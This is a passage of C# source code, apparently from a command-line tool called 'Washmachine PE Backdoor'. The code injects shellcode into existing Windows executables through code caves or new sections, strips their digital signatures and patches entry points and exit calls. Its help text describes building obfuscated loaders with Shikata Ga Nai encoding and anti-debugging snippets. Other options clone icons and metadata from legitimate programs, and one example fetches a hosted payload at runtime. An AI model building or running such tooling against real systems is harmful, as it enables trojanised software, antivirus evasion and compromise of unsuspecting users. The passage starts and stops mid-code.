        if (backdoorMode == "dropper" && implantFile != null && !File.Exists(implantFile))
        {
            WriteStatus(StatusPrefix.Failure, $"Implant file not found: '{implantFile}'. Check the path passed to -Implant.");
            return 1;
        }

        var backdoorModeEnum = backdoorMode switch
        {
            "normal"  => BackdoorMode.Normal,
            "silence" => BackdoorMode.Silence,
            "dropper" => BackdoorMode.Dropper,
            _         => BackdoorMode.Normal,
        };

        var consoleLogger = new ConsoleLogger();
        if (verbose) consoleLogger.VerboseEnabled = true;
        if (jsonOutput) consoleLogger.SuppressOutput = true;
        var paths = new AppPaths();

        // ── Load settings & decide session logging ───────────────
        var appSettings = AppSettingsService.Load();
        bool sessionLoggingEnabled = sessionLogOverride ?? appSettings.SessionLoggingEnabled;

        string? sessionDir = null;
        TeeLogger? teeLogger = null;
        IAppLogger logger = consoleLogger;

        if (sessionLoggingEnabled)
        {
            sessionDir = paths.CreateBackdoorSessionDirectory();
            string sessionLogPath = Path.Combine(sessionDir, "session.log");
            teeLogger = new TeeLogger(consoleLogger, sessionLogPath);
            logger = teeLogger;

            // Log session header
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");
            teeLogger?.FileOnly("  Washmachine PE Backdoor – Session Log");
            teeLogger?.FileOnly($"  Session dir : {sessionDir}");
            teeLogger?.FileOnly($"  Started     : {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Command-line arguments ─────────────────────────────────");
            teeLogger?.FileOnly($"  --pe            : {peFile}");
            teeLogger?.FileOnly($"  --shellcode     : {shellcodeFile}");
            teeLogger?.FileOnly($"  --output        : {outputFile ?? "(default)"}");
            teeLogger?.FileOnly($"  --method        : {method}");
            teeLogger?.FileOnly($"  --encryption    : {encryption}");
            teeLogger?.FileOnly($"  --carrier       : {carrier}");
            teeLogger?.FileOnly($"  --xor-key       : 0x{xorKey:X2}");
            teeLogger?.FileOnly($"  --section-name  : {sectionName}");
            teeLogger?.FileOnly($"  --remove-sig    : {removeSig}");
            teeLogger?.FileOnly($"  --patch-sub     : {patchSubsystem}");
            teeLogger?.FileOnly($"  --preserve-entry: {preserveEntry}");
            teeLogger?.FileOnly($"  --patch-iat     : {patchIat}");
            teeLogger?.FileOnly($"  --patch-exit    : {patchExitCalls}");
            teeLogger?.FileOnly($"  --cave-min-size : {minCaveSize}");
            teeLogger?.FileOnly($"  --dry-run       : {dryRun}");
            teeLogger?.FileOnly($"  --verbose       : {verbose}");
            teeLogger?.FileOnly($"  --json          : {jsonOutput}");
            teeLogger?.FileOnly("");
        }

        try
        {
            // ── Instantiate services ─────────────────────────────────
            var service = new PeBackdoorService(paths, logger);
            var analyzerService = new PeAnalyzerService(logger);

            // ── Banner ───────────────────────────────────────────────
            if (!jsonOutput)
            {
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]Washmachine PE Backdoor[/]")
                    .Border(BoxBorder.Double)
                    .BorderColor(Color.Cyan1));
                AnsiConsole.WriteLine();
            }

            // ── PE Analysis ──────────────────────────────────────────
            var peInfo = await service.AnalyzePeAsync(peFile);
            var analysisResult = await analyzerService.AnalyzeAsync(peFile);
            var shellcodeBytes = await File.ReadAllBytesAsync(shellcodeFile);

            // ── Log PE analysis to session file ──────────────────────
            teeLogger?.FileOnly("── Target PE Analysis ─────────────────────────────────────");
            teeLogger?.FileOnly($"  File        : {Path.GetFileName(peFile)}");
            teeLogger?.FileOnly($"  Full path   : {Path.GetFullPath(peFile)}");
            teeLogger?.FileOnly($"  Size        : {new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)");
            teeLogger?.FileOnly($"  Arch        : {(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}");
            teeLogger?.FileOnly($"  Type        : {(peInfo.IsDll ? "DLL" : "GUI Executable")}");
            teeLogger?.FileOnly($"  Entry point : 0x{peInfo.EntryPoint:X}");
            teeLogger?.FileOnly($"  ImageBase   : 0x{peInfo.ImageBase:X}");
            teeLogger?.FileOnly($"  Signature   : {(peInfo.HasSignature ? "Present (will be removed)" : "None")}");
            teeLogger?.FileOnly($"  .NET        : {(analysisResult.IsDotNet ? "Yes" : "No")}");
            teeLogger?.FileOnly($"  ASLR        : {(peInfo.HasAslr ? "Yes" : "No")}");
            teeLogger?.FileOnly($"  Sections    : {peInfo.Sections.Count}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("  Section table:");
            teeLogger?.FileOnly($"  {"Name",-10} {"VirtAddr",10} {"VirtSize",10} {"RawSize",10} {"Perms",6} {"Entropy",8}");
            teeLogger?.FileOnly($"  {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 6)} {new string('-', 8)}");
            foreach (var sec in analysisResult.Sections)
            {
                teeLogger?.FileOnly($"  {sec.Name,-10} {"0x" + sec.VirtualAddress.ToString("X6"),10} {"0x" + sec.VirtualSize.ToString("X6"),10} {"0x" + sec.RawSize.ToString("X6"),10} {sec.PermissionsString,6} {sec.Entropy,8:F2}");
            }
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Shellcode ──────────────────────────────────────────────");
            teeLogger?.FileOnly($"  File        : {Path.GetFileName(shellcodeFile)}");
            teeLogger?.FileOnly($"  Full path   : {Path.GetFullPath(shellcodeFile)}");
            teeLogger?.FileOnly($"  Size        : {shellcodeBytes.Length} bytes");
            teeLogger?.FileOnly($"  First bytes : {BitConverter.ToString(shellcodeBytes.Take(Math.Min(32, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}");
            teeLogger?.FileOnly($"  SHA-256     : {Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(shellcodeBytes))}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Pre-flight Checks ──────────────────────────────────────");
            teeLogger?.FileOnly($"  .NET assembly     : {(analysisResult.IsDotNet ? "FAIL (is .NET)" : "PASS (not .NET)")}");
            teeLogger?.FileOnly($"  Packed check      : {(analysisResult.IsPossiblyPacked ? $"WARN (entropy: {analysisResult.OverallEntropy:F2})" : $"PASS (entropy: {analysisResult.OverallEntropy:F2})")}");
            teeLogger?.FileOnly($"  Entry point valid : {(peInfo.EntryPoint != 0 ? $"PASS (0x{peInfo.EntryPoint:X})" : "FAIL (null)")}");
            teeLogger?.FileOnly($"  Digital signature : {(peInfo.HasSignature ? "Present → will strip" : "None")}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Injection Plan ─────────────────────────────────────────");
            teeLogger?.FileOnly($"  Method      : {resolvedInjection}");
            teeLogger?.FileOnly($"  Carrier     : {(isDllCarrierAlias || peInfo.IsDll ? "DllMain Hook (entry-point)" : resolvedCarrier.ToString())}");
            teeLogger?.FileOnly($"  Remove sig  : {removeSig}");
            teeLogger?.FileOnly($"  Patch GUI   : {patchSubsystem}");
            teeLogger?.FileOnly($"  Patch exit  : {patchExitCalls}");
            teeLogger?.FileOnly("");

            // Copy original shellcode to session's input/ directory
            if (sessionDir != null && appSettings.SaveShellcodeCopy)
            {
                try
                {
                    var inputDir = Path.Combine(sessionDir, "input");
                    File.Copy(shellcodeFile, Path.Combine(inputDir, Path.GetFileName(shellcodeFile)), overwrite: true);
                    teeLogger?.FileOnly($"  Copied shellcode to session: input/{Path.GetFileName(shellcodeFile)}");
                }
                catch (Exception ex)
                {
                    teeLogger?.FileOnly($"  Warning: Could not copy shellcode to session: {ex.Message}");
                }
            }
            teeLogger?.FileOnly("");

            if (!jsonOutput)
            {
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Target PE Analysis[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                AnsiConsole.WriteLine();

                var peTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                peTable.AddRow($"[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
                peTable.AddRow($"[{UiColors.Accent}]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
                peTable.AddRow($"[{UiColors.Accent}]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
                peTable.AddRow($"[{UiColors.Accent}]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
                peTable.AddRow($"[{UiColors.Accent}]Entry[/]", $"[mediumpurple1]0x{peInfo.EntryPoint:X}[/]");
                peTable.AddRow($"[{UiColors.Accent}]ImageBase[/]", $"[mediumpurple1]0x{peInfo.ImageBase:X}[/]");
                peTable.AddRow($"[{UiColors.Accent}]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
                peTable.AddRow($"[{UiColors.Accent}].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
                peTable.AddRow($"[{UiColors.Accent}]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
                peTable.AddRow($"[{UiColors.Accent}]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");

                AnsiConsole.Write(peTable);
                AnsiConsole.WriteLine();

                var sectionTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned());

                foreach (var sec in analysisResult.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "yellow" : "red";
                    sectionTable.AddRow(
                        Markup.Escape(sec.Name),
                        $"[mediumpurple1]0x{sec.VirtualAddress:X6}[/]",
                        $"[mediumpurple1]0x{sec.VirtualSize:X6}[/]",
                        $"[mediumpurple1]0x{sec.RawSize:X6}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]"
                    );
                }

                AnsiConsole.Write(sectionTable);

                // Code caves
                AnsiConsole.WriteLine();
                var caves = await service.FindCodeCavesAsync(peFile, Math.Max(minCaveSize, 50));

                // Log all caves to session file
                teeLogger?.FileOnly("── Code Caves ─────────────────────────────────────────────");
                teeLogger?.FileOnly($"  Total found: {caves.Count}");
                if (caves.Count > 0)
                {
                    teeLogger?.FileOnly($"  {"Section",-10} {"Offset",10} {"RVA",10} {"Size",12}");
                    teeLogger?.FileOnly($"  {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 12)}");
                    foreach (var c in caves)
                        teeLogger?.FileOnly($"  {c.SectionName,-10} {"0x" + c.FileOffset.ToString("X6"),10} {"0x" + c.VirtualAddress.ToString("X6"),10} {c.Size,8} bytes");
                    teeLogger?.FileOnly($"  Largest: {caves[0].SectionName} ({caves[0].Size:N0} bytes)");
                }
                teeLogger?.FileOnly("");

                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Code Caves[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Found:[/] [white]{caves.Count}[/]");

                if (caves.Count > 0)
                {
                    var caveTable = new Table()
                        .Border(TableBorder.Rounded)
                        .BorderColor(UiColors.BoxBorderColor)
                        .AddColumn($"[{UiColors.Accent}]Section[/]")
                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
                        .AddColumn($"[{UiColors.Accent}]Size[/]");

                    foreach (var cave in caves.Take(10))
                    {
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[mediumpurple1]0x{cave.FileOffset:X6}[/]",
                            $"[mediumpurple1]0x{cave.VirtualAddress:X6}[/]",
                            $"[white]{cave.Size,6} bytes[/]"
                        );
                    }

                    AnsiConsole.Write(caveTable);

                    if (caves.Count > 10)
                        AnsiConsole.MarkupLine($"  [grey]... and {caves.Count - 10} more[/]");
                    AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
                }

                // Shellcode info
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Shellcode[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());

                var scTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                scTable.AddRow($"[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
                scTable.AddRow($"[{UiColors.Accent}]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
                scTable.AddRow($"[{UiColors.Accent}]First bytes[/]", $"[mediumpurple1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");

                AnsiConsole.Write(scTable);

                // Pre-flight checks
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Pre-flight Checks[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                PrintCheck(!analysisResult.IsDotNet, "Not a .NET assembly");
                PrintCheck(!analysisResult.IsPossiblyPacked, $"Not packed (entropy: {analysisResult.OverallEntropy:F2})");
                PrintCheck(peInfo.EntryPoint != 0, $"Entry point is valid (0x{peInfo.EntryPoint:X})");

                if (resolvedInjection == InjectionMethod.CodeCave)
                {
                    int stubOverhead = peInfo.Is64Bit ? 66 : 14;
                    int needed = shellcodeBytes.Length + stubOverhead;
                    bool hasCave = caves.Any(c => c.Size >= needed);
                    PrintCheck(hasCave, $"Sufficient code cave space ({(hasCave ? $"{caves[0].Size:N0}" : "0")} >= {needed} bytes needed)");
                }

                PrintCheck(!peInfo.HasSignature || removeSig, peInfo.HasSignature
                    ? "PE has digital signature (will be removed)"
                    : "No digital signature");

                // Injection plan
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Injection Plan[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());

                var planTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                planTable.AddRow($"[{UiColors.Accent}]Method[/]", $"[white]{resolvedInjection}[/]");
                planTable.AddRow($"[{UiColors.Accent}]Invoke[/]", $"[white]{(isDllCarrierAlias || peInfo.IsDll ? "DllMain Hook (entry-point)" : resolvedCarrier.ToString())}[/]");
                planTable.AddRow($"[{UiColors.Accent}]Remove sig[/]", $"[white]{removeSig}[/]");
                planTable.AddRow($"[{UiColors.Accent}]Patch GUI[/]", $"[white]{patchSubsystem}[/]");

                AnsiConsole.Write(planTable);
                AnsiConsole.WriteLine();
            }

            if (dryRun)
            {
                teeLogger?.FileOnly("── Dry Run ────────────────────────────────────────────────");
                teeLogger?.FileOnly("  No injection performed (--dry-run flag).");
                teeLogger?.FileOnly($"  Session dir: {sessionDir}");
                if (!jsonOutput)
                {
                    var dryRunText = $"[green3_1]Dry run \u2014 no injection performed.[/]";
                    if (sessionDir != null)
                        dryRunText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(dryRunText)
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                return 0;
            }

            // ── Inject ───────────────────────────────────────────────
            var options = new PeBackdoorOptions
            {
                TargetPePath = peFile,
                ShellcodePath = shellcodeFile,
                OutputPath = outputFile ?? Path.Combine(
                    Path.GetDirectoryName(peFile) ?? ".",
                    Path.GetFileNameWithoutExtension(peFile) + ".backdoored" + Path.GetExtension(peFile)),
                Method = resolvedInjection,
                Encryption = encryptionMethod.Value,
                CarrierInvoke = resolvedCarrier,
                XorKey = xorKey,
                NewSectionName = sectionName,
                RemoveSignature = removeSig,
                PatchSubsystemToGui = patchSubsystem,
                PreserveOriginalEntry = preserveEntry,
                PatchIat = patchIat,
                PatchExitCalls = patchExitCalls,
                MinCaveSize = minCaveSize,
                Mode = backdoorModeEnum,
                ImplantPath = implantFile,
            };

            var result = jsonOutput
                ? await service.BackdoorAsync(options)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse(UiColors.Header))
                    .StartAsync("Injecting payload...", async _ => await service.BackdoorAsync(options));

            // ── Log injection result to session ──────────────────────
            teeLogger?.FileOnly("── Injection Result ───────────────────────────────────────");
            teeLogger?.FileOnly($"  Success        : {result.Success}");
            if (!string.IsNullOrEmpty(result.ErrorMessage))
                teeLogger?.FileOnly($"  Error          : {result.ErrorMessage}");
            teeLogger?.FileOnly($"  Output path    : {result.OutputPath ?? "(none)"}");
            teeLogger?.FileOnly($"  Shellcode addr : 0x{result.ShellcodeAddress:X}");
            teeLogger?.FileOnly($"  Carrier addr   : 0x{result.CarrierAddress:X}");
            teeLogger?.FileOnly($"  Shellcode size : {result.ShellcodeSize} bytes");
            teeLogger?.FileOnly($"  Carrier size   : {result.CarrierSize} bytes");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("  Steps:");
            foreach (var step in result.Steps)
                teeLogger?.FileOnly($"    ✓ {step}");
            if (result.Warnings.Count > 0)
            {
                teeLogger?.FileOnly("  Warnings:");
                foreach (var warn in result.Warnings)
                    teeLogger?.FileOnly($"    ⚠ {warn}");
            }
            teeLogger?.FileOnly("");

            // Copy the backdoored binary to session's output/ directory
            if (sessionDir != null && appSettings.SaveBinaryArtifact
                && result.Success && !string.IsNullOrEmpty(result.OutputPath) && File.Exists(result.OutputPath))
            {
                try
                {
                    string destBinaryName = Path.GetFileName(result.OutputPath);
                    var outputSubDir = Path.Combine(sessionDir, "output");
                    string destBinaryPath = Path.Combine(outputSubDir, destBinaryName);
                    File.Copy(result.OutputPath, destBinaryPath, overwrite: true);
                    var outputInfo = new FileInfo(result.OutputPath);
                    teeLogger?.FileOnly($"── Binary Artifact ────────────────────────────────────────");
                    teeLogger?.FileOnly($"  Copied to session: output/{destBinaryName}");
                    teeLogger?.FileOnly($"  Size             : {outputInfo.Length:N0} bytes");
                    teeLogger?.FileOnly($"  SHA-256          : {Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(result.OutputPath)))}");
                    teeLogger?.FileOnly("");
                }
                catch (Exception ex)
                {
                    teeLogger?.FileOnly($"  Warning: Could not copy binary to session: {ex.Message}");
                }
            }

            // Generate professional session report
            GenerateBackdoorReport(sessionDir, result, shellcodeFile, peFile, outputFile, teeLogger);

            teeLogger?.FileOnly("── Session Complete ───────────────────────────────────────");
            teeLogger?.FileOnly($"  Finished at : {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            teeLogger?.FileOnly($"  Session dir : {sessionDir}");
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputPath,
                    result.ErrorMessage,
                    result.ShellcodeAddress,
                    result.CarrierAddress,
                    result.ShellcodeSize,
                    result.CarrierSize,
                    result.Warnings,
                    result.Steps,
                    SessionDirectory = sessionDir,
                };
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var step in result.Steps)
                    AnsiConsole.MarkupLine($"    [green3_1]\u2713[/] {Markup.Escape(step)}");

                foreach (var warn in result.Warnings)
                    AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(warn)}");

                AnsiConsole.WriteLine();
                if (result.Success)
                {
                    var successText = $"[green3_1]SUCCESS: Backdoored PE written to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                        $"[grey]Output size: {new FileInfo(result.OutputPath!).Length:N0} bytes[/]";
                    if (sessionDir != null)
                        successText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(successText)
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    var failText = $"[red]FAILED: {Markup.Escape(result.ErrorMessage ?? "unknown")}[/]";
                    if (sessionDir != null)
                        failText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(failText)
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                    return 1;
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            teeLogger?.FileOnly("── EXCEPTION ──────────────────────────────────────────────");
            teeLogger?.FileOnly($"  {ex.GetType().Name}: {ex.Message}");
            teeLogger?.FileOnly($"  Stack trace:\n{ex.StackTrace}");
            teeLogger?.FileOnly($"  Session dir: {sessionDir}");

            if (jsonOutput)
            {
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(new { Success = false, Error = ex.Message, SessionDirectory = sessionDir }, JsonPrint));
            }
            else
            {
                logger.Error($"Backdoor failed: {ex.Message}");
                if (verbose) logger.Error(ex.StackTrace ?? "");
                if (sessionDir != null)
                    AnsiConsole.MarkupLine($"  [grey]Session log: {Markup.Escape(sessionDir)}[/]");
            }
            return 1;
        }
        finally
        {
            teeLogger?.Dispose();
        }
    }

    private static void GenerateBackdoorReport(string? sessionDir, BackdoorResult result,
        string shellcodeFile, string peFile, string? outputFile, TeeLogger? teeLogger)
    {
        if (sessionDir == null) return;
        try
        {
            var sb = new System.Text.StringBuilder();
            sb.AppendLine("╔══════════════════════════════════════════════════════════════╗");
            sb.AppendLine("║            WASHMACHINE PE BACKDOOR — SESSION REPORT         ║");
            sb.AppendLine("╚══════════════════════════════════════════════════════════════╝");
            sb.AppendLine();
            sb.AppendLine($"  Status      : {(result.Success ? "SUCCESS" : "FAILED")}");
            sb.AppendLine($"  Timestamp   : {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            sb.AppendLine($"  Session     : {Path.GetFileName(sessionDir)}");
            sb.AppendLine();
            sb.AppendLine("── Configuration ──────────────────────────────────────────────");
            sb.AppendLine($"  Target PE   : {peFile}");
            sb.AppendLine($"  Shellcode   : {shellcodeFile}");
            sb.AppendLine($"  Output      : {result.OutputPath ?? outputFile ?? "(default)"}");
            sb.AppendLine();

            if (result.Success && !string.IsNullOrEmpty(result.OutputPath) && File.Exists(result.OutputPath))
            {
                var info = new FileInfo(result.OutputPath);
                sb.AppendLine("── Output Binary ──────────────────────────────────────────────");
                sb.AppendLine($"  Path        : {result.OutputPath}");
                sb.AppendLine($"  Size        : {info.Length:N0} bytes");
                sb.AppendLine($"  SHA-256     : {Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(result.OutputPath)))}");
                sb.AppendLine();
            }

            if (!result.Success && !string.IsNullOrEmpty(result.ErrorMessage))
            {
                sb.AppendLine("── Error ──────────────────────────────────────────────────────");
                sb.AppendLine($"  {result.ErrorMessage}");
                sb.AppendLine();
            }

            if (result.Warnings?.Count > 0)
            {
                sb.AppendLine("── Warnings ───────────────────────────────────────────────────");
                foreach (var w in result.Warnings)
                    sb.AppendLine($"  ⚠ {w}");
                sb.AppendLine();
            }

            sb.AppendLine("── Session Artifacts ──────────────────────────────────────────");
            foreach (var file in Directory.GetFiles(sessionDir, "*", SearchOption.AllDirectories))
            {
                var rel = Path.GetRelativePath(sessionDir, file);
                var size = new FileInfo(file).Length;
                sb.AppendLine($"  {rel,-45} {size,10:N0} bytes");
            }
            sb.AppendLine();
            sb.AppendLine("═══════════════════════════════════════════════════════════════");

            File.WriteAllText(Path.Combine(sessionDir, "report.txt"), sb.ToString());
        }
        catch (Exception ex)
        {
            teeLogger?.FileOnly($"  Warning: Could not generate session report: {ex.Message}");
        }
    }

    private static void PrintCheck(bool ok, string message)
    {
        var icon = ok ? "[green3_1]\u2713[/]" : "[red]\u2717[/]";
        AnsiConsole.MarkupLine($"    {icon} {Markup.Escape(message)}");
    }

    private static CommandUsage[] GetHelpCatalog() =>
    [
        BuildEncodeUsage(),
        BuildAnalyzeUsage(),
        BuildBackdoorUsage(),
        BuildStripUsage(),
        BuildShowUsage(),
        BuildProvisionUsage(),
        BuildTestUsage(),
        BuildScanUsage(),
    ];

    private static CommandUsage BuildEncodeUsage() =>
        new(
            Name: "encode",
            Summary: "Compile a fresh loader from shellcode, raw hex, or a hosted payload URL.",
            Syntax: "washmachine-cli encode <source> [options]",
            Description: "The encode pipeline provisions missing tooling when needed, runs Bin2Shell, merges YAML template/snippet selections, and compiles the final loader.",
            WhenToUse: "Start here when you have payload bytes and want a new loader binary rather than patching an existing PE.",
            Output: "Creates a compiled executable and keeps source/build artifacts under logging/session_<timestamp>_<slug>/.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Source input (choose one)",
                    "Provide exactly one payload source per run.",
                    [
                        new UsageOption("-s, -Shellcode <file>", "Read raw shellcode bytes from a .bin file."),
                        new UsageOption("-ShellcodeHex <hex>", "Inline raw hex bytes such as FC4883E4F0... or \\xfc\\x48\\x83...."),
                        new UsageOption("-u, -ShellcodeUrl <url>", "Build a web-delivery loader that fetches the payload at runtime."),
                    ]),
                new UsageOptionGroup(
                    "Encoding and build",
                    "These values control the Bin2Shell stage and the generated loader.",
                    [
                        new UsageOption("-t, -Template <id>", "Template ID from the active YAML playbook.", "minimal"),
                        new UsageOption("-e, -Encoder <index>", "Bin2Shell encoder index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
                        new UsageOption("-v, -Envelope <index>", "Bin2Shell envelope index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
                        new UsageOption("-Sgn", "Enable Shikata Ga Nai preprocessing before compilation."),
                        new UsageOption("-SgnCount <count>", "Shikata Ga Nai iteration count. Setting this also enables SGN.", "1"),
                        new UsageOption("-SgnMax <bytes>", "Maximum SGN decoder-obfuscation bytes. Setting this also enables SGN.", "50"),
                        new UsageOption("-SgnPlacement <mode>", "When to apply SGN relative to the Bin2Shell stage.", "pre", "pre | post"),
                        new UsageOption("-Verbose", "Show detailed progress, compiler output, and warnings."),
                        new UsageOption("-Json", "Emit machine-friendly JSON instead of the styled terminal report."),
                    ]),
                new UsageOptionGroup(
                    "Template overrides",
                    "Use these flags to steer the playbook without editing YAML.",
                    [
                        new UsageOption("-Snippet <section>=<id[,id...]>", "Override one snippet section. Multi-select sections accept comma-separated IDs in a single flag or repeated flags."),
                        new UsageOption("-Text <input-id>=<value>", "Provide or override a text input that a template/snippet expects."),
                    ]),
                new UsageOptionGroup(
                    "Post-compile finishing",
                    "These only apply after a successful compile.",
                    [
                        new UsageOption("-CloneFrom <exe>", "Clone icon, metadata, and resources from another executable."),
                        new UsageOption("-CloneResources", "Force general resource cloning on when -CloneFrom is set."),
                        new UsageOption("-NoCloneResources", "Disable general resource cloning even when -CloneFrom is set."),
                        new UsageOption("-CloneIcon", "Force icon cloning on when -CloneFrom is set."),
                        new UsageOption("-NoCloneIcon", "Disable icon cloning even when -CloneFrom is set."),
                        new UsageOption("-CloneMetadata", "Force VERSIONINFO metadata cloning on when -CloneFrom is set."),
                        new UsageOption("-NoCloneMetadata", "Disable VERSIONINFO metadata cloning even when -CloneFrom is set."),
                        new UsageOption("-PadNops <bytes>", "Append NOP bytes to inflate the final executable size."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "What to expect",
                    Notes:
                    [
                        new UsageNote("Provisioning", "Bin2Shell is provisioned automatically before compile. Optional SGN is provisioned automatically when an SGN flag is used."),
                        new UsageNote("Templates", "The selected template decides which snippet sections exist and which defaults are applied."),
                        new UsageNote("Snippet syntax", "Use -Snippet section=id for single-select sections and -Snippet section=id1,id2 for multi-select sections."),
                        new UsageNote("Discovery", "Run show templates, show modules, and show encoders to inspect live catalog data on this machine."),
                    ]),
                new UsageSection(
                    "Shell and path tips",
                    Notes:
                    [
                        new UsageNote("PowerShell / pwsh", @"Use .\payload.bin or C:\path\payload.bin. Quote paths with spaces, for example "".\My Payloads\payload.bin""."),
                        new UsageNote("Bash / Zsh", @"Use ./payload.bin or /path/payload.bin. Quote paths with spaces, for example ""./My Payloads/payload.bin""."),
                        new UsageNote("Raw hex", "If your shell treats backslashes specially, wrap the value in quotes."),
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli encode", "Drop into the interactive encode session (no flags).", "Any shell"),
                new UsageExample("washmachine-cli encode -s .\\payload.bin -t minimal", "Compile a minimal loader from a local file.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli encode -s ./payload.bin -e 1 -v 1", "Add a Bin2Shell encoder and envelope to a file-based build.", "Bash / Zsh"),
                new UsageExample("washmachine-cli encode -ShellcodeHex \"FC4883E4F0...\" -Snippet antidebugging=IsDebuggerPresentCheck", "Build directly from inline hex and override one snippet.", "Any shell"),
                new UsageExample("washmachine-cli encode -u https://host/payload.bin -Verbose", "Generate a web-delivery loader from a hosted payload URL.", "Any shell"),
                new UsageExample("washmachine-cli encode -s payload.bin -Sgn -SgnCount 2 -SgnMax 64", "Preprocess shellcode with SGN before the normal encode pipeline.", "Any shell"),
